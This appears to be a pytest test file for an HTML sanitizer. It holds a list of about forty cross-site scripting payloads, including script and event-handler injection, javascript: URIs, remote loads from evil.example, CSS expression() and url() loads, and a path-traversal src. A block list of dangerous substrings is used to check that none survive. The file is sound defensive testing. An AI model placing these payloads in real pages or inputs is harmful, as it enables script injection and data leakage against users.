"""The HTML cleaner for screen rules: a list of attacks, and the shapes that must survive (stage 11)."""

from __future__ import annotations

import json

import pytest

from tavern.core.safe_html import clean_style, sanitize, text_of

ATTACKS = [
    "<script>alert(1)</script>",
    "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<img src=x onerror=alert(1)>",
    "<img src=\"javascript:alert(1)\">",
    "<img src=\"https://evil.example/pixel.gif\">",
    "<img src=\"//evil.example/pixel.gif\">",
    "<img src=\"/assets/../../etc/passwd\">",
    "<a href=\"javascript:alert(1)\">x</a>",
    "<a href=\" JaVa\tScRiPt:alert(1)\">x</a>",
    "<a href=\"&#106;avascript:alert(1)\">x</a>",
    "<a href=\"data:text/html;base64,PHNjcmlwdD4=\">x</a>",
    "<a href=\"vbscript:msgbox(1)\">x</a>",
    "<a href=\"\u0001javascript:alert(1)\">x</a>",
    "<iframe src=\"https://evil.example\"></iframe>",
    "<object data=\"x\"></object><embed src=\"x\">",
    "<form action=\"https://evil.example\"><input name=p><button>go</button></form>",
    "<svg onload=alert(1)><circle/></svg>",
    "<math><mi xlink:href=\"javascript:alert(1)\">x</mi></math>",
    "<style>body{display:none}</style>",
    "<link rel=stylesheet href=\"https://evil.example/x.css\">",
    "<meta http-equiv=refresh content=\"0;url=https://evil.example\">",
    "<base href=\"https://evil.example/\">",
    "<div onclick=\"alert(1)\" onmouseover=alert(1)>x</div>",
    "<div style=\"background:url(https://evil.example/x.png)\">x</div>",
    "<div style=\"width:expression(alert(1))\">x</div>",
    "<div style=\"position:fixed;top:0;left:0;width:100%;height:100%\">x</div>",
    "<div style=\"margin-left:-5000px\">x</div>",
    "<div style=\"background-image:url('https://evil.example/x')\">x</div>",
    "<div style=\"color:red;behavior:url(x.htc)\">x</div>",
    "<div style=\"@import 'https://evil.example/x.css'\">x</div>",
    "<video src=x onerror=alert(1)></video><audio src=x></audio>",
    "<textarea><script>alert(1)</script></textarea>",
    "<!--<script>alert(1)</script>-->",
    "<![CDATA[<script>alert(1)</script>]]>",
    "<?php echo 1 ?>",
    "<template><script>alert(1)</script></template>",
    "<noscript><img src=x onerror=alert(1)></noscript>",
    "<button formaction=\"https://evil.example\">x</button>",
    "<details open ontoggle=alert(1)>x</details>",
    "<p title=\"\"><img src=x onerror=alert(1)//\">",
]
BAD = ("<script", "javascript", "onerror", "onclick", "onload", "onmouseover", "ontoggle", "evil.example",
       "etc/passwd", "expression", "position", "fixed", "behavior", "@import", "<iframe", "<form", "<style",
       "<svg", "<object", "<embed", "<video", "<link", "<meta", "<base", "vbscript", "data:text")


def elements(nodes: list) -> list:
    """The tree without its text: text is shown as text by the page, so only elements can do harm."""
    return [{**n, "c": elements(n["c"])} for n in nodes if isinstance(n, dict)]


@pytest.mark.parametrize("attack", ATTACKS)
def test_attacks_leave_nothing_that_runs_or_loads(attack: str) -> None:
    tree = json.dumps(elements(sanitize(attack)), ensure_ascii=False).lower()
    for needle in BAD:
        assert needle not in tree, (needle, attack, tree)
    assert not any(isinstance(n, dict) and n["t"] in ("script", "iframe", "form", "svg", "style")
                   for n in sanitize(attack))


def test_alert_text_never_becomes_an_element() -> None:
    tree = sanitize("<script>alert(1)</script>ok")
    assert text_of(tree) == "ok"          # a script is dropped with its content


def test_the_shapes_trackers_use_survive() -> None:
    html = ('<div style="display:flex; gap:8px; background:#223; color:#fff; padding:4px 8px; border-radius:6px">'
            '<span style="font-weight:bold">HP</span><progress value="30" max="100"></progress>'
            '<a href="https://example.com/x">link</a></div>'
            '<table><tr><td colspan="2" title="t">x</td></tr></table><details open><summary>s</summary>t</details>'
            '<img src="/assets/pic.png" alt="a" width="40">')
    tree = sanitize(html)
    flat = json.dumps(tree)
    for kept in ('"display": "flex"', '"background": "#223"', '"t": "progress"', '"href": "https://example.com/x"',
                 '"colspan": "2"', '"t": "details"', '"src": "/assets/pic.png"', '"t": "table"'):
        assert kept in flat, kept
    assert text_of(tree) == "HPlinkxst"


def test_unknown_tags_show_as_text_and_nothing_is_lost() -> None:
    assert text_of(sanitize("<status>hp 5</status>")) == "<status>hp 5</status>"
    assert text_of(sanitize("a < b and c > d, 1<3")) == "a < b and c > d, 1<3"


def test_layout_whitespace_between_blocks_goes_away() -> None:
    tree = sanitize("<div>\n  <div>a</div>\n  <div>b</div>\n</div>")
    assert text_of(tree) == "ab"


def test_a_half_written_tag_is_held_back_while_streaming() -> None:
    assert text_of(sanitize("<b>hp</b> <div sty", stream=True)) == "hp "
    assert text_of(sanitize("<div><b>half", stream=True)) == "half"     # unclosed tags are closed
    assert text_of(sanitize("a < b", stream=True)) == "a < b"            # a lone "<" followed by ">" is not cut
    assert text_of(sanitize("<b>hp</b> <div sty")) == "hp "              # a tag never finished is dropped, not shown


def test_depth_and_size_are_limited() -> None:
    deep = "<div>" * 500 + "x" + "</div>" * 500
    tree = json.dumps(sanitize(deep))
    assert tree.count('"t": "div"') <= 31
    many = "<b>x</b>" * 6000
    assert json.dumps(sanitize(many)).count('"t": "b"') == 0 or len(sanitize(many)) <= 20001


@pytest.mark.parametrize(("style", "kept"), [
    ("color:red", {"color": "red"}),
    ("COLOR: red !important", {"color": "red"}),
    ("background:linear-gradient(90deg,#fff,#000)", {"background": "linear-gradient(90deg,#fff,#000)"}),
    ("width:url(x)", {}),
    ("margin:-4px", {}),
    ("display:contents", {}),
    ("z-index:9999", {}),
    ("color:red;position:absolute;padding:2px", {"color": "red", "padding": "2px"}),
    ("font-family:'Fira Code', monospace", {"font-family": "'Fira Code', monospace"}),
])
def test_style_is_filtered(style: str, kept: dict[str, str]) -> None:
    assert clean_style(style) == kept
